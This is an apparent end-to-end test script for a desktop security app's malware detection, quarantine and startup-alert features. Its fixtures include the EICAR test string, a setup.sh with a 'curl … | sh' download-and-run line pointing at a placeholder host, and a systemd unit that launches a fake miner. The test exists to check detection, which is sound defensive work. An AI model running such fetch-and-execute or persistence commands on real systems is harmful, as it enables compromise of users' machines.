// SPDX-License-Identifier: LicenseRef-PolyForm-Shield-1.0.0
// Usage (Linux): KEEPER_SKIP_TOUR=1 xvfb-run -a -s "-screen 0 1440x900x24" node test/e2e/security.cjs /tmp/ksec /tmp/ksec-shots [clamav-db folder]
// Drives the real Keeper app: Privacy & Security overview (score, most worth
// doing, every area card opening its tab), permissions from a Flatpak
// stand-in, a Chromium profile with a risky extension, the EICAR test file
// arriving in Downloads (real-time detection → quarantine → put back), a new
// systemd user unit (startup alert), a scan (ClamAV joins when a signature
// database folder is given), Ignore and Stop ignoring, and the same extension
// in the Fix-it List: details on opening, Trust with Undo, and Stop trusting
// under "Snoozed, ignored and trusted".
const { _electron } = require('playwright');
const fs = require('fs');
const path = require('path');

const HOME = path.resolve(process.argv[2]);
const SHOTS = path.resolve(process.argv[3] || path.join(HOME, 'shots'));
const CLAMDB = process.argv[4] ? path.resolve(process.argv[4]) : undefined;
const ROOT = path.resolve(__dirname, '../..');
const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
let failed = 0;
const check = (ok, label) => { console.log(`${ok ? 'PASS' : 'FAIL'} ${label}`); if (!ok) failed++; };
const until = async (fn, ms = 20000, step = 250) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { const v = await fn(); if (v) return v; await new Promise((r) => setTimeout(r, step)); } return null; };

fs.rmSync(HOME, { recursive: true, force: true });
for (const d of ['Downloads', 'Desktop', 'Documents', 'scanme', '.config/systemd/user', 'bin']) fs.mkdirSync(path.join(HOME, d), { recursive: true });
fs.mkdirSync(SHOTS, { recursive: true });

// A Chromium profile with one risky extension and one harmless one.
const chrome = path.join(HOME, '.config/google-chrome');
const ext = (id, manifest) => { const d = path.join(chrome, 'Default/Extensions', id, '1.0_0'); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'manifest.json'), JSON.stringify(manifest)); };
fs.mkdirSync(path.join(chrome, 'Default'), { recursive: true });
fs.writeFileSync(path.join(chrome, 'Local State'), JSON.stringify({ profile: { info_cache: { Default: { name: 'Person 1' } } }, dns_over_https: { mode: 'off' } }));
fs.writeFileSync(path.join(chrome, 'Default/Preferences'), JSON.stringify({ extensions: { settings: { aaaabbbbccccddddeeeeffffgggghhhh: { state: 1, from_webstore: false, location: 4 }, bbbbccccddddeeeeffffgggghhhhiiii: { state: 1, from_webstore: true, location: 1 } } } }));
ext('aaaabbbbccccddddeeeeffffgggghhhh', { name: 'Coupon Finder Pro', version: '2.3', manifest_version: 3, permissions: ['cookies', 'webRequest', 'history'], host_permissions: ['<all_urls>'] });
ext('bbbbccccddddeeeeffffgggghhhhiiii', { name: 'Dark Reader Lite', version: '1.0', manifest_version: 3, permissions: ['storage'] });

// A stand-in for the flatpak command: two apps with permissions.
fs.writeFileSync(path.join(HOME, 'bin/flatpak'), `#!/bin/sh
case "$1" in
  permissions) printf 'Table\\tObject\\tApp\\tPermissions\\tData\\ndevices\\tcamera\\tcom.slack.Slack\\tyes\\t0x00\\nscreenshot\\tscreenshot\\torg.example.Recorder\\tyes\\t0x00\\n' ;;
  list) printf 'com.slack.Slack\\norg.example.Recorder\\n' ;;
  info) if [ "$3" = "org.example.Recorder" ]; then printf '[Context]\\nsockets=x11;pulseaudio;\\ndevices=all;\\nfilesystems=home;\\n'; else printf '[Context]\\nsockets=wayland;\\n'; fi ;;
esac
`, { mode: 0o755 });

// ClamAV's signatures, if a database folder was given (copied where Keeper keeps its own).
const userData = path.join(HOME, '.config/Keeper');
if (CLAMDB) { fs.mkdirSync(path.join(userData, 'security/clamav-db'), { recursive: true }); for (const f of fs.readdirSync(CLAMDB)) if (/\.(cvd|cld|cud)$/.test(f)) fs.copyFileSync(path.join(CLAMDB, f), path.join(userData, 'security/clamav-db', f)); }

(async () => {
  const app = await _electron.launch({ executablePath: path.join(ROOT, 'node_modules/.bin/electron'), args: [ROOT, '--no-sandbox'], env: { ...process.env, KEEPER_DEFAULTS: 'before-1.0', HOME, NODE_OPTIONS: '', XDG_CONFIG_HOME: path.join(HOME, '.config'), XDG_DATA_HOME: path.join(HOME, '.local/share'), PATH: `${path.join(HOME, 'bin')}:${process.env.PATH}` } });
  await app.firstWindow();
  const w = await until(async () => app.windows().find((x) => { const u = x.url(); return u && (!u.includes('view=') || u.includes('view=app')); }), 30000, 200);
  const errors = [];
  w.on('pageerror', (e) => errors.push(e.message));
  await w.waitForSelector('.sidebar', { timeout: 60000 });
  await w.waitForTimeout(2500);
  // The first-run tour covers the window; skip it.
  const skip = await w.$('.tour button:has-text("Skip tour")');
  if (skip) await skip.click();
  await w.evaluate(() => { try { localStorage.setItem('coach.protection', '1'); } catch { /* ignore */ } });
  const sec = (fn, ...a) => w.evaluate(([f, args]) => window.keeper.security[f](...args), [fn, a]);
  const EXT_ID = 'browser.ext.Chrome.aaaabbbbccccddddeeeeffffgggghhhh';
  // The page's own tabs (Overview … Timeline) sit under the hub's tabs; those that do not fit are in More.
  const tabOn = async (id) => (await w.getByTestId(`sec-tab-${id}`).getAttribute('aria-selected', { timeout: 1000 }).catch(() => null)) === 'true';
  const openTab = async (id, text) => {
    if (await w.getByTestId(`sec-tab-${id}`).count()) await w.getByTestId(`sec-tab-${id}`).click();
    else { await w.locator('.sec-checktabs .tabs-more').click(); await w.getByRole('menuitem', { name: text, exact: true }).click(); }
    return !!(await until(() => tabOn(id), 5000));
  };
  const openSecurity = async () => {
    await w.click('.sidebar [title="Privacy & Security"]');
    return !!(await until(() => w.$('.sec-checktabs'), 30000));
  };

  check(await openSecurity(), 'Privacy & Security opens with its tabs');
  check(await w.getByTestId('hub-tab-security').getAttribute('aria-selected') === 'true', 'the hub’s Overview tab is chosen');
  check(!!(await until(() => w.$('[data-testid="sec-score"]'), 30000)) && /\d+\s*of 100/.test(await w.getByTestId('sec-score').textContent()), 'the overview shows a score out of 100');
  const ov = await sec('overview', true);
  check(typeof ov.score === 'number' && ov.findings.length > 0, `overview has a score (${ov.score}) and ${ov.findings.length} findings`);
  check(ov.findings.some((f) => f.id === 'browser.ext.Chrome.aaaabbbbccccddddeeeeffffgggghhhh' && f.severity === 'high'), 'the risky Chrome extension is a high finding');
  check(ov.findings.every((f) => f.verify) && ov.findings.filter((f) => f.fix).every((f) => f.fix.kind), 'every finding has a verify probe and a fix kind (guided fixes)');
  check(ov.engines.some((e) => e.id === 'builtin' && e.state === 'on') && ov.engines.some((e) => e.id === 'yara' && e.state === 'on'), 'built-in and YARA engines report on');
  check(new RegExp(`^${ov.score}\\s*of 100`).test((await w.getByTestId('sec-score').textContent()).trim()), `the page shows the same score (${ov.score})`);
  const topIds = async () => (await w.getByTestId('sec-finding').evaluateAll((els) => els.map((e) => e.dataset.id))).join(',');
  check(ov.top.length > 0 && !!(await until(async () => (await topIds()) === ov.top.map((x) => x.id).join(','), 10000)), `Most worth doing lists the ${ov.top.length} most severe findings`);
  await w.screenshot({ path: path.join(SHOTS, 'overview-light.png') });

  // Every area card on the overview opens its tab.
  for (const [id, text] of [['watch', 'Who can watch'], ['connections', 'Connections'], ['browsers', 'Browsers'], ['checks', 'Security checks'], ['malware', 'Malware'], ['startup', 'Startup items']]) {
    await openTab('overview', 'Overview');
    await w.getByTestId(`sec-area-${id}`).click();
    check(!!(await until(() => tabOn(id), 5000)), `the ${text} card opens its tab`);
  }
  check(await openTab('timeline', 'Timeline'), 'the Timeline tab opens');
  check(await openTab('connections', 'Connections') && !!(await until(() => w.$('text=Sites and their third parties'), 10000)), 'Connections shows apps and sites');
  check(await openTab('checks', 'Security checks') && !!(await until(async () => (await w.getByTestId('sec-finding').count()) > 0, 10000)), 'Security checks lists findings');

  // Who can watch: from the Flatpak stand-in.
  await openTab('watch', 'Who can watch');
  check(!!(await until(() => w.$('text=com.slack.Slack'), 15000)), 'permissions list Flatpak apps (camera for Slack)');
  const perms = await sec('permissions');
  check(perms.grants.some((g) => g.app === 'org.example.Recorder' && g.service === 'files'), 'a broad Flatpak right (home folder) is shown');
  await w.screenshot({ path: path.join(SHOTS, 'watch-light.png') });

  // Browsers.
  await openTab('browsers', 'Browsers');
  check(!!(await until(() => w.$('text=Coupon Finder Pro'), 15000)), 'Browsers lists the Chrome profile’s extensions');
  check(!!(await w.$('text=Secure DNS: off')), 'Browsers shows that secure DNS is off');
  await w.screenshot({ path: path.join(SHOTS, 'browsers-light.png') });

  // Real-time protection: the EICAR test file arrives in Downloads.
  const dl = path.join(HOME, 'Downloads/eicar.com');
  fs.writeFileSync(dl, EICAR);
  const q = await until(async () => { const l = await sec('quarantine'); return l.length ? l : null; }, 30000, 400);
  check(!!q && q[0].name === 'eicar.com', 'the test file is detected as it arrives and quarantined');
  check(!fs.existsSync(dl), 'the original is gone from Downloads');
  const sealed = q ? fs.readFileSync(path.join(userData, `security/quarantine/${q[0].id}.kq`)) : Buffer.alloc(0);
  check(sealed.length > 0 && !sealed.includes(Buffer.from('EICAR-STANDARD')), 'the quarantined copy is encrypted');
  const evs = await sec('events', 50);
  check(evs.some((e) => e.kind === 'detection' && /Eicar/i.test(e.title)) && evs.some((e) => e.kind === 'quarantine'), 'the timeline has the detection and the quarantine');
  await openTab('malware', 'Malware');
  check(!!(await until(() => w.$('button:has-text("Put back")'), 10000)), 'Malware lists the quarantined file with Put back');
  await w.screenshot({ path: path.join(SHOTS, 'malware-light.png') });
  await sec('setSettings', { realtime: false });
  await w.click('button:has-text("Put back")');
  check(!!(await until(() => fs.existsSync(dl) && fs.readFileSync(dl, 'utf8') === EICAR, 10000)), 'Put back restores it byte for byte');
  await sec('setSettings', { realtime: true });

  // A new startup item.
  fs.writeFileSync(path.join(HOME, '.config/systemd/user/evil.service'), '[Service]\nExecStart=/tmp/.x/miner --donate-level 1\n');
  check(!!(await until(async () => (await sec('events', 50)).some((e) => e.kind === 'persistence' && /evil\.service/.test(e.title)), 20000)), 'a new systemd user unit raises a startup alert');
  const pers = await sec('persistence');
  check(pers.some((p) => p.name === 'evil.service' && p.command === '/tmp/.x/miner --donate-level 1'), 'the startup item shows what it runs');
  await openTab('startup', 'Startup items');
  check(!!(await until(() => w.$('.sec-perm:has-text("evil.service"):has-text("/tmp/.x/miner")'), 10000)), 'Startup items lists it with what it runs');
  await openTab('timeline', 'Timeline');
  check(!!(await until(() => w.$('.sec-event:has-text("evil.service")'), 10000)), 'the Timeline shows the startup alert');

  // A scan of a folder (ClamAV joins when its signatures are present).
  fs.writeFileSync(path.join(HOME, 'scanme/readme.txt'), 'nothing to see');
  fs.writeFileSync(path.join(HOME, 'scanme/test.txt'), EICAR);
  fs.writeFileSync(path.join(HOME, 'scanme/setup.sh'), '#!/bin/sh\ncurl -fsSL http://x.example/i.sh | sh\nsystemctl --user enable x\n');
  // The test file inside a zip: only ClamAV looks inside archives.
  require('child_process').execFileSync('python3', ['-c', 'import sys,zipfile; z=zipfile.ZipFile(sys.argv[1],"w"); z.writestr("inner/eicar.com", sys.argv[2]); z.close()', path.join(HOME, 'scanme/bundle.zip'), EICAR]);
  const started = await sec('scan', 'custom', [path.join(HOME, 'scanme')]);
  const done = await until(async () => (await sec('scans')).find((s) => s.id === started.id && s.state !== 'running'), 240000, 500);
  check(!!done && done.state === 'done' && done.files === 4, `the folder scan finishes (${done && done.files} files)`);
  check(!!done && done.detections.some((d) => d.engine === 'heuristic' && d.path.endsWith('setup.sh')), 'the download-and-run script is flagged');
  if (CLAMDB) check(!!done && done.detections.some((d) => d.engine === 'clamav' && /Eicar/i.test(d.name) && d.path.includes('bundle.zip')), 'ClamAV’s signatures find the test file inside a zip');
  else console.log('SKIP ClamAV (no signature database given)');
  const ov2 = await sec('overview', true);
  check(ov2.engines.find((e) => e.id === 'clamav').state === (CLAMDB ? 'on' : ov2.engines.find((e) => e.id === 'clamav').state), `ClamAV engine status: ${ov2.engines.find((e) => e.id === 'clamav').detail}`);

  // Ignore a security check from its row; it no longer counts. Stop ignoring brings it back.
  await openTab('checks', 'Security checks');
  const f = ov2.findings.find((x) => x.area === 'posture' && !x.ignored && x.severity !== 'info');
  const fRow = w.locator(`[data-testid="sec-finding"][data-id="${f.id}"]`);
  // One clear action per row; Ignore is under More.
  const ignoreItem = async () => { await fRow.getByTestId('sec-more').click(); return w.getByTestId('sec-ignore'); };
  await (await ignoreItem()).click();
  check(!!(await until(async () => /Ignored/.test(await fRow.textContent()), 10000)) && (await (await ignoreItem()).textContent()).trim() === 'Stop ignoring', `Ignore marks “${f.title}” ignored`);
  await w.keyboard.press('Escape');
  const ov3 = await sec('overview');
  check(ov3.score >= ov2.score && ov3.findings.find((x) => x.id === f.id).ignored, 'an ignored finding stops counting');
  await (await ignoreItem()).click();
  check(!!(await until(async () => !/Ignored/.test(await fRow.textContent()), 10000)) && !(await sec('overview')).findings.find((x) => x.id === f.id).ignored, 'Stop ignoring counts it again');

  // The same extension in the Fix-it List: details, Trust and Undo, Stop trusting.
  await w.click('.sidebar [title="Fix-it List"]');
  await w.getByRole('button', { name: /Check again/ }).click();
  const fx = w.locator(`[data-testid="fixit-row"][data-id="security:${EXT_ID}"]`);
  const fxShown = async () => {
    if (await fx.count() && await fx.isVisible()) return true;
    // Similar findings are grouped; open the groups to find it.
    for (const g of await w.locator('[data-testid="fixit-group"]:not(.open) .fx-toggle').all()) await g.click().catch(() => undefined);
    return (await fx.count()) > 0 && fx.isVisible();
  };
  check(!!(await until(fxShown, 60000, 500)), 'the risky extension is in the Fix-it List');
  check(/Coupon Finder Pro/.test(await fx.locator('.finding-title').textContent()), 'the row names the extension');
  check(await fx.getByRole('button', { name: /More actions/ }).count() === 1 && await fx.getByTestId('fixit-fix').count() === 1 && await fx.locator('.fx-actions button').count() === 2, 'the row has Fix and More (Trust and Snooze inside)');
  await fx.locator('.fx-toggle').click();
  check(await fx.locator('.fx-toggle').getAttribute('aria-expanded') === 'true', 'the row opens');
  check(!!(await until(async () => /Why it is on the list/.test(await fx.getByTestId('fixit-details').textContent().catch(() => '')), 20000)), 'its details say why it is on the list');
  const xd = await fx.getByTestId('fixit-details').textContent();
  check(xd.includes('aaaabbbbccccddddeeeeffffgggghhhh') && xd.includes('2.3'), 'the details show the extension’s id and version');
  await w.screenshot({ path: path.join(SHOTS, 'fixit-details-light.png') });
  await fx.getByTestId('fixit-more').click();
  await w.getByTestId('fixit-trust').click();
  check(!!(await until(async () => (await fx.count()) === 0, 10000)), 'Trust hides it');
  const undo = w.locator('.toast', { hasText: 'Trusted' }).getByRole('button', { name: 'Undo' });
  check(!!(await until(async () => (await undo.count()) > 0, 5000)), 'Trust offers Undo');
  await undo.first().click();
  check(!!(await until(fxShown, 10000)), 'Undo brings it back');
  await fx.getByTestId('fixit-more').click();
  await w.getByTestId('fixit-trust').click();
  check(!!(await until(async () => (await fx.count()) === 0, 10000)), 'Trust hides it again');
  await w.getByTestId('fixit-later-tab').click();
  check(/Snoozed, ignored and trusted/.test(await w.getByTestId('fixit-later-tab').textContent()) && !!(await until(fxShown, 10000)), 'it is listed under Snoozed, ignored and trusted');
  check(/Trusted/.test(await fx.textContent()) && (await fx.getByTestId('fixit-bring-back').textContent()).includes('Stop trusting'), 'it says Trusted and offers Stop trusting');
  await fx.getByTestId('fixit-bring-back').click();
  check(!!(await until(async () => (await fx.count()) === 0, 10000)), 'Stop trusting takes it off that list');
  await w.getByTestId('fixit-later-tab').click().catch(() => undefined);
  check(!!(await until(fxShown, 10000)), 'it is back among the things to fix');
  check(!(await w.evaluate(() => window.keeper.guide.list())).findings.some((x) => x.id === `security:${EXT_ID}` && x.status !== 'open'), 'its state is open again');
  check(await openSecurity(), 'back to Privacy & Security');

  // Dark screenshots.
  await w.evaluate(() => window.keeper.settings.set({ appearance: 'dark' }));
  await w.waitForTimeout(500);
  for (const [tab, name] of [['Overview', 'overview'], ['Startup items', 'startup'], ['Timeline', 'timeline']]) {
    check(await openTab(name, tab), `${tab} opens (dark)`);
    await w.waitForTimeout(700);
    await w.screenshot({ path: path.join(SHOTS, `${name}-dark.png`) });
  }
  check(errors.length === 0, `no page errors${errors.length ? ': ' + errors.join(' | ') : ''}`);
  await app.close();
  console.log(failed ? `${failed} FAILED` : 'ALL PASSED');
  process.exit(failed ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
